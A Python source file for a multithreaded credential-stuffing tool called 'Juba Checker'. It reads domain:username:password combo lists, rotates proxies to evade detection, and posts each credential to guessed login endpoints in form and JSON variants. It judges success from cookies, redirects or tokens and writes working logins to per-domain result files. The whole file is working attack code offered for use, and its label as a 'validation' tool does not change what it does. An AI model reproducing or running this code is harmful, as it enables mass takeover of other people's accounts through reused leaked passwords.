import requests
import logging
import time
from typing import Optional, Dict, List, Tuple
from urllib.parse import urljoin, urlparse
from concurrent.futures import ThreadPoolExecutor, as_completed
from pathlib import Path
import json
from threading import Lock

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('juba_checker.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)


class ProxyManager:
    def __init__(self, proxy_file: Optional[str] = None):
        self.proxies: List[str] = []
        self.current_index = 0
        self.lock = Lock()
        self.validated_proxies: List[str] = []
        
        if proxy_file:
            self.load_proxies(proxy_file)
            self.validate_proxies()
    
    def load_proxies(self, proxy_file: str):
        try:
            with open(proxy_file, 'r') as f:
                self.proxies = [line.strip() for line in f if line.strip()]
            logger.info(f"Loaded {len(self.proxies)} proxies from {proxy_file}")
        except Exception as e:
            logger.error(f"Failed to load proxies: {e}")
    
    def validate_proxies(self):
        logger.info("Validating proxies...")
        for proxy in self.proxies:
            if self._test_proxy(proxy):
                self.validated_proxies.append(proxy)
        logger.info(f"Validated {len(self.validated_proxies)}/{len(self.proxies)} proxies")
        self.proxies = self.validated_proxies
    
    def _test_proxy(self, proxy: str) -> bool:
        try:
            proxies = {
                'http': proxy,
                'https': proxy
            }
            response = requests.get('http://httpbin.org/ip', proxies=proxies, timeout=5)
            return response.status_code == 200
        except:
            return False
    
    def get_next_proxy(self) -> Optional[Dict[str, str]]:
        if not self.proxies:
            return None
        
        with self.lock:
            proxy = self.proxies[self.current_index]
            self.current_index = (self.current_index + 1) % len(self.proxies)
        
        return {
            'http': proxy,
            'https': proxy
        }


class CredentialChecker:
    def __init__(self, proxy_manager: Optional[ProxyManager] = None, timeout: int = 10):
        self.proxy_manager = proxy_manager
        self.timeout = timeout
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        self.common_endpoints = ['/login', '/signin', '/api/login', '/api/auth/login', '/auth/login']
        self.results_lock = Lock()
    
    def parse_credential_line(self, line: str) -> Optional[Tuple[str, str, str]]:
        parts = line.strip().split(':')
        if len(parts) >= 3:
            domain = parts[0]
            username = parts[1]
            password = ':'.join(parts[2:])
            return domain, username, password
        return None
    
    def normalize_domain(self, domain: str) -> str:
        if not domain.startswith(('http://', 'https://')):
            domain = 'https://' + domain
        return domain
    
    def find_login_endpoint(self, domain: str) -> Optional[str]:
        for endpoint in self.common_endpoints:
            url = urljoin(domain, endpoint)
            try:
                proxies = self.proxy_manager.get_next_proxy() if self.proxy_manager else None
                response = self.session.get(url, timeout=self.timeout, proxies=proxies, allow_redirects=True)
                if response.status_code in [200, 405]:
                    return url
            except:
                continue
        return urljoin(domain, '/login')
    
    def attempt_login(self, domain: str, username: str, password: str) -> bool:
        domain = self.normalize_domain(domain)
        login_url = self.find_login_endpoint(domain)
        
        credentials_variants = [
            {'username': username, 'password': password},
            {'email': username, 'password': password},
            {'user': username, 'password': password},
            {'login': username, 'password': password}
        ]
        
        for credentials in credentials_variants:
            try:
                proxies = self.proxy_manager.get_next_proxy() if self.proxy_manager else None
                
                response = self.session.post(
                    login_url,
                    data=credentials,
                    timeout=self.timeout,
                    proxies=proxies,
                    allow_redirects=False
                )
                
                if self._is_successful_login(response):
                    logger.info(f"✓ Success: {domain} - {username}")
                    return True
                
                response_json = self.session.post(
                    login_url,
                    json=credentials,
                    timeout=self.timeout,
                    proxies=proxies,
                    allow_redirects=False
                )
                
                if self._is_successful_login(response_json):
                    logger.info(f"✓ Success: {domain} - {username}")
                    return True
                    
            except requests.exceptions.RequestException as e:
                logger.debug(f"Request failed for {domain}: {e}")
                continue
            except Exception as e:
                logger.debug(f"Unexpected error for {domain}: {e}")
                continue
        
        logger.debug(f"✗ Failed: {domain} - {username}")
        return False
    
    def _is_successful_login(self, response: requests.Response) -> bool:
        if response.status_code in [200, 201, 302, 303, 307, 308]:
            if 'Set-Cookie' in response.headers or 'set-cookie' in response.headers:
                return True
            
            if response.status_code in [302, 303, 307, 308]:
                location = response.headers.get('Location', '')
                if 'dashboard' in location.lower() or 'home' in location.lower() or 'profile' in location.lower():
                    return True
            
            try:
                json_response = response.json()
                if isinstance(json_response, dict):
                    success_indicators = ['token', 'access_token', 'session', 'success']
                    if any(key in json_response for key in success_indicators):
                        if json_response.get('success') is not False:
                            return True
            except:
                pass
            
            error_indicators = ['error', 'invalid', 'incorrect', 'failed', 'wrong']
            response_text = response.text.lower()
            if not any(indicator in response_text for indicator in error_indicators):
                if len(response_text) > 100:
                    return True
        
        return False
    
    def save_result(self, domain: str, username: str, password: str, output_dir: str = 'results'):
        parsed_domain = urlparse(self.normalize_domain(domain)).netloc
        domain_folder = Path(output_dir) / parsed_domain
        domain_folder.mkdir(parents=True, exist_ok=True)
        
        result_file = domain_folder / 'results.txt'
        
        with self.results_lock:
            with open(result_file, 'a', encoding='utf-8') as f:
                f.write(f"{domain}:{username}:{password}\n")
    
    def process_credential(self, line: str, output_dir: str = 'results') -> Optional[Dict]:
        credential = self.parse_credential_line(line)
        if not credential:
            return None
        
        domain, username, password = credential
        
        try:
            if self.attempt_login(domain, username, password):
                self.save_result(domain, username, password, output_dir)
                return {
                    'domain': domain,
                    'username': username,
                    'password': password,
                    'status': 'success'
                }
        except Exception as e:
            logger.error(f"Error processing {domain}:{username} - {e}")
        
        return None
    
    def process_file(self, file_path: str, output_dir: str = 'results', workers: int = 10, dry_run: bool = False):
        logger.info(f"Processing file: {file_path}")
        
        try:
            with open(file_path, 'r', encoding='utf-8') as f:
                lines = [line.strip() for line in f if line.strip()]
        except Exception as e:
            logger.error(f"Failed to read file {file_path}: {e}")
            return
        
        if dry_run:
            logger.info(f"DRY RUN: Would process {len(lines)} credentials from {file_path}")
            for line in lines[:5]:
                credential = self.parse_credential_line(line)
                if credential:
                    logger.info(f"  Would check: {credential[0]} - {credential[1]}")
            if len(lines) > 5:
                logger.info(f"  ... and {len(lines) - 5} more")
            return
        
        successful = 0
        with ThreadPoolExecutor(max_workers=workers) as executor:
            futures = {executor.submit(self.process_credential, line, output_dir): line for line in lines}
            
            for future in as_completed(futures):
                result = future.result()
                if result:
                    successful += 1
        
        logger.info(f"Completed {file_path}: {successful}/{len(lines)} successful logins")
    
    def process_folder(self, folder_path: str, output_dir: str = 'results', workers: int = 10, dry_run: bool = False):
        folder = Path(folder_path)
        if not folder.exists():
            logger.error(f"Folder not found: {folder_path}")
            return
        
        search_files = list(folder.glob('search_*.txt'))
        
        if not search_files:
            logger.warning(f"No search_*.txt files found in {folder_path}")
            return
        
        logger.info(f"Found {len(search_files)} files to process")
        
        for file_path in search_files:
            self.process_file(str(file_path), output_dir, workers, dry_run)


def main():
    import argparse
    
    parser = argparse.ArgumentParser(description='Juba Checker - Credential Validation Tool')
    parser.add_argument('--folder', required=True, help='Folder containing search_*.txt files')
    parser.add_argument('--output', default='results', help='Output directory for results')
    parser.add_argument('--workers', type=int, default=10, help='Number of worker threads')
    parser.add_argument('--proxy-file', help='Path to proxy.txt file')
    parser.add_argument('--dry-run', action='store_true', help='Show what would be checked without performing login attempts')
    
    args = parser.parse_args()
    
    proxy_manager = ProxyManager(args.proxy_file) if args.proxy_file else None
    checker = CredentialChecker(proxy_manager=proxy_manager)
    
    checker.process_folder(args.folder, args.output, args.workers, args.dry_run)


if __name__ == '__main__':
    main()
